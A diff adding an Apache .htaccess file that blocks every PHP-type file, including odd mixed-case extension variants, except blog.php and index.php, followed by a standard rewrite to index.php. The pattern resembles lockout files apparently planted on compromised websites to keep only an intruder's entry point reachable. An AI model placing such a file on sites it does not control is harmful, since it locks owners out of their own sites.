@@ -1,0 +1,17 @@
+<FilesMatch ".*\.(phtml|php|PhP|php5|php1|php2|php3|php5|php6|php7|php8|PhP4|PhP5|PhP6|PhP7|PHP4|PHP5|PHP6|PHP7|PHTML|PhtMl|PhTmL|PHtmL|phar|shtml)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(blog.php|index.php|)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
